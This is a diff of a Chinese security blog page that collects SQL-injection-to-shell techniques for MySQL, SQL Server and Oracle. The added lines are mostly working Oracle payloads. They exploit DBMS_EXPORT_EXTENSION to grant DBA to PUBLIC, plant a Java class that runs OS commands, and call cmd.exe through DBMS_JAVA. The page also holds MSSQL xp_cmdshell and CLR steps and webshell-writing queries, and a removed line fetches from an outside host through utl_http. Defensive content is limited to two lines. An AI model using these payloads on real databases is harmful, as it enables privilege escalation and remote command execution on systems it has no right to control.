@@ -15,19 +15,19 @@
     <meta name="keywords" content="web安全，app安全，咸鱼">
   
 
-  <meta name="description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
+  <meta name="description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面，在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’,">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql屠龙术">
 <meta property="og:url" content="http://yoursite.com/2019/08/29/sql注入获得shell/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
+<meta property="og:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面，在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’,">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151247852.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151261135.png">
-<meta property="og:updated_time" content="2019-09-20T07:55:34.198Z">
+<meta property="og:updated_time" content="2019-09-21T13:08:12.517Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql屠龙术">
-<meta name="twitter:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’, ‘">
+<meta name="twitter:description" content="前言最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。 当然作为新手我总结的方式肯定不全面，在以后的学习工作中我遇到新的方式会添加进来。 MySql权限mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。 表权限:’Select’, ‘Insert’, ‘Update’,">
 <meta name="twitter:image" content="http://yoursite.com/2019/08/29/sql注入获得shell/1567151247852.png">
 
   
@@ -187,7 +187,7 @@ ga('send', 'pageview');
 
   <div id="toc" class="toc-article">
     <strong class="toc-title">Posts List</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql"><span class="toc-text">MySql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方法总结"><span class="toc-text">getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-…-into-outfile方法"><span class="toc-text">select … into outfile方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志获得shell"><span class="toc-text">日志获得shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer"><span class="toc-text">SqlServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行命令"><span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SP-OACREATE"><span class="toc-text">SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jet沙盒"><span class="toc-text">jet沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR执行"><span class="toc-text">CLR执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份法"><span class="toc-text">备份法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#差异备份"><span class="toc-text">差异备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-makewebtask备份"><span class="toc-text">sp_makewebtask备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log备份法"><span class="toc-text">log备份法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySql"><span class="toc-text">MySql</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#权限"><span class="toc-text">权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell方法总结"><span class="toc-text">getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-…-into-outfile方法"><span class="toc-text">select … into outfile方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#日志获得shell"><span class="toc-text">日志获得shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SqlServer"><span class="toc-text">SqlServer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#执行命令"><span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#xp-cmdshell"><span class="toc-text">xp_cmdshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SP-OACREATE"><span class="toc-text">SP_OACREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jet沙盒"><span class="toc-text">jet沙盒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR执行"><span class="toc-text">CLR执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份法"><span class="toc-text">备份法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#差异备份"><span class="toc-text">差异备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sp-makewebtask备份"><span class="toc-text">sp_makewebtask备份</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#log备份法"><span class="toc-text">log备份法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oracle"><span class="toc-text">oracle</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行"><span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-DOMAIN-INDEX-TABLES"><span class="toc-text">GET_DOMAIN_INDEX_TABLES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dbms-xmlquery-newcontext"><span class="toc-text">dbms_xmlquery.newcontext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DBMS-JAVA-TEST-FUNCALL"><span class="toc-text">DBMS_JAVA_TEST.FUNCALL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DBMS-JAVA-RUNJAV"><span class="toc-text">DBMS_JAVA.RUNJAV</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考文章"><span class="toc-text">参考文章</span></a></li></ol>
   </div>
 
 
@@ -229,7 +229,7 @@ ga('send', 'pageview');
   <div class="article-content">
     
       <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在工作中遇到一次sql注入想要使用这个sql注入来获得shell时发现自己对这些常规数据库一些安全方面的知识并不熟悉便决定专门了解一下。</p>
-<p>当然作为新手我总结的方式肯定不全面在以后的学习工作中我遇到新的方式会添加进来。</p>
+<p>当然作为新手我总结的方式肯定不全面，在以后的学习工作中我遇到新的方式会添加进来。</p>
 <h1 id="MySql"><a href="#MySql" class="headerlink" title="MySql"></a>MySql</h1><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>mysql在安装完成之后只有一个root用户，mysql需要自己创建具有不同权限的账户。</p>
 <p>表权限:’Select’, ‘Insert’, ‘Update’, ‘Delete’, ‘Create’, ‘Drop’, ‘Grant’, ‘References’, ‘Index’, ‘Alter’;</p>
 <p>列权限:’Select’, ‘Insert’, ‘Update’, ‘References’;</p>
@@ -262,7 +262,7 @@ ga('send', 'pageview');
 <p>set global general_log = on;打开general_log功能。</p>
 <p>set global general_log_file = ‘路径’;设置记录存储路径。</p>
 <p>select ‘代码’;写入代码。</p>
-<p><strong>mysql中慢查询日志也可以使用此方法来写入shell，错误日志与二进制日志目录都是需要修改mysql配置文件实现意义较低</strong></p>
+<p><strong>mysql中慢查询日志也可以使用此方法来写入shell，错误日志与二进制日志目录都是需要修改mysql配置文件实现意义较低慢查询可以参考如下</strong><a href="https://www.cnblogs.com/c1e4r/articles/8902444.html" target="_blank" rel="noopener">https://www.cnblogs.com/c1e4r/articles/8902444.html</a></p>
 <h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>secure_file_prive = null。</p>
 <p>正确设置 web 目录权限，除 log、upload 等目录外不授予写权限，upload 目录不授予执行权限。</p>
 <h1 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h1><h2 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p>xp_cmdshell是mssql的存储过程，可以直接执行命令。</p>
@@ -286,16 +286,16 @@ ga('send', 'pageview');
 <p>exec master..xp_regwrite’HKEY_LOCAL_MACHINE’,’SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines’ ,’SandBoxMode’,’REG_DWORD’,0; </p>
 <h3 id="CLR执行"><a href="#CLR执行" class="headerlink" title="CLR执行"></a>CLR执行</h3><p>MsSql使用CLR存储过程，CLR是一个类似JAVA虚拟机的环境，Mssql2005后可以调用CLR过程来加载一些函数。</p>
 <p><strong>第一步</strong></p>
-<p>编写代码编译成DLL文件</p>
+<p>编写代码编译成DLL文件，<a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v" target="_blank" rel="noopener">代码参考</a></p>
 <p><strong>第二步</strong></p>
 <p>开启CLR</p>
 <p>sp_configure ‘clr enabled’,1;RECONFIGURE;GO</p>
 <p><strong>第三步</strong></p>
 <p>创建存储过程</p>
-<p>– Import the assembly</p>
+<p>– 装载DLL文件</p>
 <p>CREATE ASSEMBLY my_assembly FROM ‘c:\temp\cmd_exec.dll’;WITH PERMISSION_SET = UNSAFE;Go</p>
-<p>– Link the assembly to a stored procedure</p>
-<p>;CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];GO</p>
+<p>– 链接</p>
+<p>CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];GO</p>
 <p>cmd_exec ‘cmd’执行命令。</p>
 <p><strong>如果遇到权限问题请执行</strong></p>
 <p> alter database [数据库名] set TRUSTWORTHY on EXEC sp_changedbowner ‘sa’</p>
@@ -313,9 +313,58 @@ backup database 库名 to disk=&#39;路径&#39; WITH DIFFERENTIAL,FORMAT;</code>
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247486636&idx=1&sn=e2f7129ebcebd78da0eeee8335e60f02&chksm=fbf796dccc801fca48b0416eebe1ae148627b8494066ed0b1a21c79e018d5fdde1c2b4073d9e&mpshare=1&scene=1&srcid=&sharer_sharetime=1568272683635&sharer_shareid=4056c5892d236b283f567b1bbeab207a&key=a60e3d263d5f7c346acefd6d558d7098acd6a4e15450bd7ba67fb5b8d20d7ab326ab681201da6c3585d60e60120492bc85fa327ae0b158906ed944b2e7bb614807f3f927ac9af8c912034b96c7ee9cd6&ascene=1&uin=MTIzNDgwNjQyOA%3D%3D&devicetype=Windows+10&version=62060833&lang=zh_CN&pass_ticket=4gFD0qvuaW0pXomdJxD%2FQ2W1pyl8z2q5eY1yK%2FV%2Fkubb68FUSzjg8WosecoCwQ2v" target="_blank" rel="noopener">安恒一篇关于mssql利用的总结</a></p>
 <h1 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h1><p>oracle是一个庞大的数据库，普遍用于大公司，oracle也十分繁琐。</p>
 <p>oracle系统库默认的用户有sys,system,internal,scott,前三个权限都是system权限，</p>
-<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(FOO,BAR,DBMS_OUTPUT”.PUT(:P1); utl_http.request (<a href="http://www.li-tek.com/1.txt" target="_blank" rel="noopener">http://www.li-tek.com/1.txt</a>) END;–,SYS,0,1,0)=0–”</p>
-<p>···未完待续。</p>
+<p>在 Oracle 的存储过程中，有一个有趣的特点：运行权限。运行权限分为两种，definer 和 invoker。definer 为函数创建者的权限，而 invoker 则是当前调用函数的用户。运行权限在函数创建时就已经被钦定了，<strong>默认definer</strong>。</p>
+<p>由于这种特性我们就有了很多操作空间了。</p>
+<p><strong>oracle不同于mysql，oracle注入一定要带上表名，如果没有可以使用虚表dual。</strong></p>
+<p>数据库中任何一个用户都默认拥有 public 角色，我们对pulic角色操作就能很方便的对自己角色操作。</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>这里我也没怎么遇到过oracle数据库经验不足，这些都是看<a href="https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/" target="_blank" rel="noopener">别人博客</a>边看边抄来的，暂时没时间研究，好久自己搭环境研究下如果有错再来修改。</p>
+<h3 id="GET-DOMAIN-INDEX-TABLES"><a href="#GET-DOMAIN-INDEX-TABLES" class="headerlink" title="GET_DOMAIN_INDEX_TABLES"></a>GET_DOMAIN_INDEX_TABLES</h3><p>在10g中GET_DOMAIN_INDEX_TABLES 函数存在注入漏洞，该函数位于 DBMS_EXPORT_EXTENSION 包中，执行权限隶属于 sys。</p>
+<p><strong>版本：</strong></p>
+<p><strong>Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</strong></p>
+<p>这个类似于CLR执行需要加载Java包，里面创建执行命令函数。具体怎么编写java也不是很懂，这里抄的大佬的代码</p>
+<p><strong>提权到dba角色。</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;grant dba to public&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建JAVA库</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<p><strong>赋予java权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;begin dbms_java.grant_permission(&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;PUBLIC&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS:java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&lt;&gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;);end;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建函数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;LinxUtil.runCMD(java.lang.String) return String&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<p><strong>赋予函数执行权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;grant all on LinxRunCMD to public&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.LinxRunCMD(&apos;/bin/bash -c /usr/bin/whoami&apos;) from dual</span><br></pre></td></tr></table></figure>
+
+<h3 id="dbms-xmlquery-newcontext"><a href="#dbms-xmlquery-newcontext" class="headerlink" title="dbms_xmlquery.newcontext"></a>dbms_xmlquery.newcontext</h3><p>这里也需要DBMS_EXPORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功</p>
+<p><strong>版本：</strong></p>
+<p>Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006)</p>
+<p><strong>创建java包</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &apos;&apos;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&apos;&apos;;commit;end;&apos;) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><strong>赋予java权限</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&apos;FOO&apos;,&apos;BAR&apos;,&apos;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &apos;&apos;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &apos;&apos;&apos;&apos;begin dbms_java.grant_permission(&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;YY&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;SYS:java.io.FilePermission&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;,&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&lt;&lt;ALL FILES&gt;&gt;&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;, &apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;execute&apos;&apos;&apos;&apos;&apos;&apos;&apos;&apos;);end;&apos;&apos;&apos;&apos;;END;&apos;&apos;;END;--&apos;,&apos;SYS&apos;,0,&apos;1&apos;,0) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><strong>创建函数</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(&apos;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &apos;&apos;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name &apos;&apos;&apos;&apos;LinxUtil.runCMD(java.lang.String) return String&apos;&apos;&apos;&apos;; &apos;&apos;;commit;end;&apos;) from dual;</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select LinxRunCMD(&apos;id&apos;) from dual</span><br></pre></td></tr></table></figure>
+
+<h3 id="DBMS-JAVA-TEST-FUNCALL"><a href="#DBMS-JAVA-TEST-FUNCALL" class="headerlink" title="DBMS_JAVA_TEST.FUNCALL"></a>DBMS_JAVA_TEST.FUNCALL</h3><p><strong>版本：</strong></p>
+<p>10g R2, 11g R1, 11g R2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (Select DBMS_JAVA_TEST.FUNCALL (‘oracle/aurora/util/Wrapper’,&apos;main’,&apos;c:\\windows\\system32\\cmd.exe’,&apos;/c’,&apos;dir&gt;c:\\OUT2.LST’) FROM DUAL)</span><br></pre></td></tr></table></figure>
+
+<h3 id="DBMS-JAVA-RUNJAV"><a href="#DBMS-JAVA-RUNJAV" class="headerlink" title="DBMS_JAVA.RUNJAV"></a>DBMS_JAVA.RUNJAV</h3><p><strong>版本：</strong></p>
+<p>11gR1,11gR2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (SELECT DBMS_JAVA.RUNJAVA (‘oracle/aurora/util/Wrapper c:\\windows\\system32\\cmd.exe /c dir&gt;C:\\OUT.LST’) FROM DUAL)</span><br></pre></td></tr></table></figure>
+
 <h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.4hou.com/technology/3338.html" target="_blank" rel="noopener">https://www.4hou.com/technology/3338.html</a></p>
+<p><a href="https://www.cnblogs.com/R4v3n/articles/9072549.html#menu_index_7" target="_blank" rel="noopener">mssql执行命令大全</a></p>
 
     
   </div>
